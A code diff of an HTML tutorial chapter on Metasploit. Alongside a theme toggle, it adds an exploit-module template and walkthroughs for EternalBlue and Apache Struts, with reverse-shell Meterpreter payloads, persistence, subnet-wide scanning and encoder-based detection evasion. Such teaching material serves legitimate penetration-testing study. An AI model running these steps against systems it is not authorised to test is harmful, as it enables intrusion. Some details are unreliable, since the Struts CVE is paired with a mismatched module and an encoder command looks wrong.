@@ -12,6 +12,7 @@
             color: #fff;
             margin: 0;
             padding: 0;
+            transition: background-color 0.3s, color 0.3s;
         }
 
         header {
@@ -80,7 +81,7 @@
             max-width: 800px;
             margin: 20px auto;
             padding: 10px;
-            text-align: left; /* Align content to the left */
+            text-align: left;
         }
 
         h2,
@@ -89,7 +90,7 @@
             color: #b30000;
             margin-top: 20px;
             font-weight: bold;
-            text-align: left; /* Align headers to the left */
+            text-align: left;
         }
 
         pre {
@@ -102,11 +103,11 @@
             overflow-x: auto;
             margin: 15px 0;
             white-space: pre-wrap;
-            text-align: left; /* Align code text to the left */
+            text-align: left;
         }
 
         code {
-            font-family: 'Courier New', monospace; /* Use a monospaced font for code */
+            font-family: 'Courier New', monospace;
         }
 
         footer {
@@ -119,7 +120,32 @@
             width: 100%;
             color: yellow;
         }
+
+        .light-mode {
+            background-color: #fff;
+            color: #000;
+        }
+
+        .light-mode header {
+            color: black;
+            border-color: #b30000;
+        }
+
+        .light-mode ul li a {
+            color: #000;
+            border-color: #b30000;
+        }
+
+        .light-mode pre {
+            background-color: #f5f5f5;
+            color: black;
+        }
     </style>
+    <script>
+        function toggleTheme() {
+            document.body.classList.toggle('light-mode');
+        }
+    </script>
 </head>
 
 <body>
@@ -129,6 +155,7 @@
 
     <nav>
         <h2>Table of Contents</h2>
+        <button onclick="toggleTheme()">Toggle Light/Dark Mode</button>
         <ul>
             <li><a href="#introduction">5.1 Introduction to Metasploit</a></li>
             <li><a href="#setup">5.2 Setting Up Metasploit</a></li>
@@ -162,11 +189,8 @@
         <h2 id="setup">5.2 Setting Up Metasploit</h2>
 
         <h3 id="installation">5.2.1 Installation</h3>
-        <button class="collapsible" onclick="toggleCollapsible(this)">Kali Linux</button>
-        <div class="content-section">
-            <p>Kali Linux comes pre-installed with Metasploit. You can start Metasploit by simply typing:</p>
-            <pre><code>msfconsole</code></pre>
-        </div>
+        <p>Kali Linux comes pre-installed with Metasploit. You can start Metasploit by simply typing:</p>
+        <pre><code>msfconsole</code></pre>
 
         <h3 id="custom-modules">5.3.3 Creating and Using Custom Modules</h3>
         <p>Creating custom modules in Metasploit allows you to tailor exploits, payloads, and auxiliary functions to specific needs. This flexibility is crucial for advanced penetration testing and research.</p>
@@ -175,51 +199,220 @@
         <ul>
             <li>
                 <strong>Module Template</strong>: Start with a template. Here’s a basic template for an exploit module:
-                <pre><code>class MetasploitModule < Msf::Exploit::Remote
+                <pre><code>class MetasploitModule &lt; Msf::Exploit::Remote
   Rank = NormalRanking
 
   include Msf::Exploit::Remote::Tcp
-
+  
+  # Initialize the exploit module
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Custom Exploit',
-      'Description'    => %q{
-        This module exploits a custom vulnerability.
+      'Name'           =&gt; 'Custom Exploit',
+      'Description'    =&gt; %q{
+        This module exploits a custom vulnerability in [target application/version].
+        The exploit works by [brief description of what the exploit does].
       },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Your Name'],
-      'References'     => [
+      'License'        =&gt; MSF_LICENSE,
+      'Author'         =&gt; ['Your Name'],
+      'References'     =&gt; [
         ['CVE', '2021-XXXX'],
-        ['URL', '<https://example.com>']
+        ['URL', 'https://example.com/vulnerability-details']
       ],
-      'Payload'        => {
-        'Space'    => 4000,
-        'BadChars' => "\\x00\\x0a\\x0d",
+      'Payload'        =&gt; {
+        # Define the payload options and characteristics
+        'Space'    =&gt; 4000,  # Maximum space available for the payload
+        'BadChars' =&gt; "\\x00\\x0a\\x0d",  # Characters to avoid in the payload
       },
-      'Platform'       => 'win',
-      'Targets'        => [
-        ['Windows', { 'Arch' => ARCH_X86 }]
+      'Platform'       =&gt; 'win',  # Target platform
+      'Targets'        =&gt; [
+        # Define supported targets and architecture
+        ['Windows', { 'Arch' =&gt; ARCH_X86 }]
       ],
-      'DefaultOptions' => {
-        'EXITFUNC' => 'process',
+      'DefaultOptions' =&gt; {
+        # Default options for the exploit
+        'EXITFUNC' =&gt; 'process',
       },
-      'DisclosureDate' => 'Jan 01 2021',
-      'DefaultTarget'  => 0
+      'DisclosureDate' =&gt; 'Jan 01 2021',  # Date of vulnerability disclosure
+      'DefaultTarget'  =&gt; 0  # Default target index
     ))
   end
 
+  # Main exploit method
   def exploit
+    # Establish a connection to the target
     connect
+
+    # Create and send the payload to the target
     sock.put(payload.encoded)
+
+    # Handle the session if the exploit is successful
     handler
+
+    # Disconnect from the target
     disconnect
+  end
+
+  # Here you may want to define additional methods, such as those for checking
+  # if the target is vulnerable, for building the payload, or for handling responses.
+  # Example:
+  def check
+    connect
+    # (Implementation of vulnerability check)
+    disconnect
+    return CheckCode::Safe  # or CheckCode::Vuln, CheckCode::Appears
   end
 end</code></pre>
             </li>
         </ul>
 
-        <h2 id="summary">Summary</h2>
-        <p>The Metasploit Framework is a versatile and powerful tool for penetration testing, offering extensive capabilities for exploiting vulnerabilities, conducting post-exploitation activities, and automating tasks. By mastering Metasploit, you can significantly enhance your penetration testing skills and improve your ability to identify and mitigate security risks.</p>
+        <h2 id="using">5.3 Using Metasploit</h2>
+
+        <h3 id="module-types">5.3.2 Module Types</h3>
+        <p>Metasploit features various module types, each serving distinct purposes:</p>
+
+        <h4 id="auxiliary-modules">Auxiliary Modules</h4>
+        <p>Auxiliary modules are used for scanning, enumeration, and other non-exploit tasks.</p>
+        <p><strong>Example: TCP Port Scanner</strong></p>
+        <p>Scenario: You want to identify open ports on a target system.</p>
+        <h4>How It's Done:</h4>
+        <ol>
+            <li>Start Metasploit:</li>
+            <pre><code>msfconsole</code></pre>
+            <li>Search for the TCP Port Scanner Module:</li>
+            <pre><code>search type:auxiliary port</code></pre>
+            <li>Load the TCP Port Scanner Module:</li>
+            <pre><code>use auxiliary/scanner/portscan/tcp</code></pre>
+            <li>Set Module Options:</li>
+            <pre><code>set RHOSTS &lt;target_ip&gt;
+set PORTS 1-1000</code></pre>
+            <li>Execute the Scan:</li>
+            <pre><code>run</code></pre>
+        </ol>
+
+        <h4 id="exploit-modules">Exploit Modules</h4>
+        <p>Exploit modules are designed to take advantage of specific vulnerabilities in systems or applications.</p>
+        <p><strong>Example: MS17-010 (EternalBlue)</strong> - Scenario: Target a Windows system that is unpatched and has SMB vulnerabilities.</p>
+        <h4>How It's Done:</h4>
+        <ol>
+            <li>Start Metasploit:</li>
+            <pre><code>msfconsole</code></pre>
+            <li>Search for the EternalBlue Module:</li>
+            <pre><code>search ms17_010</code></pre>
+            <li>Use the Exploit Module:</li>
+            <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+            <li>Set Required Options:</li>
+            <pre><code>set RHOSTS &lt;target_ip&gt;
+set LHOST &lt;your_ip&gt;
+set LPORT 4444</code></pre>
+            <li>Select a Payload:</li>
+            <pre><code>set payload windows/x64/meterpreter/reverse_tcp</code></pre>
+            <li>Run the Exploit:</li>
+            <pre><code>exploit</code></pre>
+        </ol>
+
+        <h4 id="payloads">Payloads</h4>
+        <p>Payloads are the code that gets executed on the target system after a successful exploit.</p>
+        <p>Scenario: You have exploited a vulnerability and want to interact with the target system dynamically.</p>
+        <h4>How It's Done:</h4>
+        <ol>
+            <li>After gaining a Meterpreter session:</li>
+            <pre><code>sysinfo  # Displays system info
+screenshot  # Takes a screenshot
+upload &lt;local_file_path&gt; &lt;target_destination_path&gt;</code></pre>
+        </ol>
+
+        <h2 id="workflow">5.4 Metasploit in a Penetration Testing Workflow</h2>
+        <p>The penetration testing lifecycle typically includes planning, scanning, exploitation, post-exploitation, and reporting. Here’s how Metasploit fits into each of these phases:</p>
+
+        <h3>1. Planning and Reconnaissance</h3>
+        <p>Identify potential targets and gather as much information as possible about the target environment.</p>
+        <h4>Example Walkthrough:</h4>
+        <ol>
+            <li>Run initial reconnaissance with Nmap:</li>
+            <pre><code>nmap -sP &lt;target_network&gt;</code></pre>
+            <li>Load an Auxiliary Module for further enumeration:</li>
+            <pre><code>use auxiliary/scanner/smb/smb_version
+set RHOSTS &lt;identified_hosts&gt;
+run</code></pre>
+        </ol>
+
+        <h3>2. Scanning</h3>
+        <p>Scan open ports and discover service versions.</p>
+        <h4>Example:</h4>
+        <pre><code>nmap -p 445 --script vuln &lt;target_ip&gt;</code></pre>
+
+        <h3>3. Exploitation</h3>
+        <p>Use exploit modules to gain access.</p>
+
+        <h3>4. Post-Exploitation</h3>
+        <p>Maintain access and gather information using Meterpreter.</p>
+
+        <h3>5. Reporting</h3>
+        <p>Use Metasploit’s built-in reporting tools:</p>
+        <pre><code>db_export -f xml -aE -o /path/to/report.xml</code></pre>
+
+        <h2 id="common-exploits">5.5 Examples of Common Exploits</h2>
+
+        <h3>1. MS17-010 (EternalBlue)</h3>
+        <p>This SMB vulnerability allows for remote code execution on unpatched Windows systems.</p>
+        <h4>Detailed Walkthrough:</h4>
+        <ol>
+            <li>Identify unpatched Windows systems with Nmap:</li>
+            <pre><code>nmap -p 445 --script vuln &lt;target_ip&gt;</code></pre>
+            <li>Set up Metasploit and the exploit:</li>
+            <pre><code>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+            <li>Configure required parameters:</li>
+            <pre><code>set RHOSTS &lt;target_ip&gt;
+set LHOST &lt;your_ip&gt;</code></pre>
+            <li>Run the exploit:</li>
+            <pre><code>exploit</code></pre>
+            <li>Post-exploitation:</li>
+            <pre><code>run persistence</code></pre>
+        </ol>
+        <p><strong>Mitigation:</strong> Ensure SMB signing is enabled and apply relevant security patches.</p>
+
+        <h3>2. Apache Struts CVE-2017-5638</h3>
+        <p>This is a command injection vulnerability due to improper handling of user-supplied data.</p>
+        <h4>Detailed Walkthrough:</h4>
+        <ol>
+            <li>Check for vulnerable versions with Nmap:</li>
+            <pre><code>nmap -p 80 --script http-vuln-cve2017-5638 &lt;target_ip&gt;</code></pre>
+            <li>Set up Metasploit:</li>
+            <pre><code>msfconsole
+use exploit/multi/http/struts_dmi_rest</code></pre>
+            <li>Configure module options:</li>
+            <pre><code>set RHOST &lt;target_ip&gt;
+set RPORT 80
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST &lt;your_ip&gt;</code></pre>
+            <li>Run the exploit:</li>
+            <pre><code>exploit</code></pre>
+        </ol>
+        <p><strong>Mitigation:</strong> Upgrade to a secure version of Apache Struts, apply WAF rules.</p>
+
+        <h2 id="advanced-techniques">5.6 Advanced Metasploit Techniques</h2>
+
+        <h3>1. Automating Attacks</h3>
+        <p>Using Metasploit API, you can automate scanning and exploitation tasks.</p>
+        <h4>Example: Automate a network scan:</h4>
+        <pre><code>#!/bin/bash
+(
+echo "use auxiliary/scanner/portscan/tcp"
+echo "set RHOSTS 192.168.1.0/24"
+echo "set PORTS 1-65535"
+echo "run"
+echo "exit"
+) | msfconsole -r</code></pre>
+
+        <h3>2. Evading Detection</h3>
+        <p>Obfuscate payloads with Metasploit's built-in encoders:</p>
+        <pre><code>set ENCODING x86/shikata_ga_nai</code></pre>
+
+        <h3>3. Integration with Other Tools</h3>
+        <p>Metasploit can be integrated with tools like Burp Suite and Nmap for enhanced capabilities.</p>
+        <p>Example: Use Burp Suite for initial reconnaissance before exploiting findings with Metasploit.</p>
+
     </div>
 
     <footer>
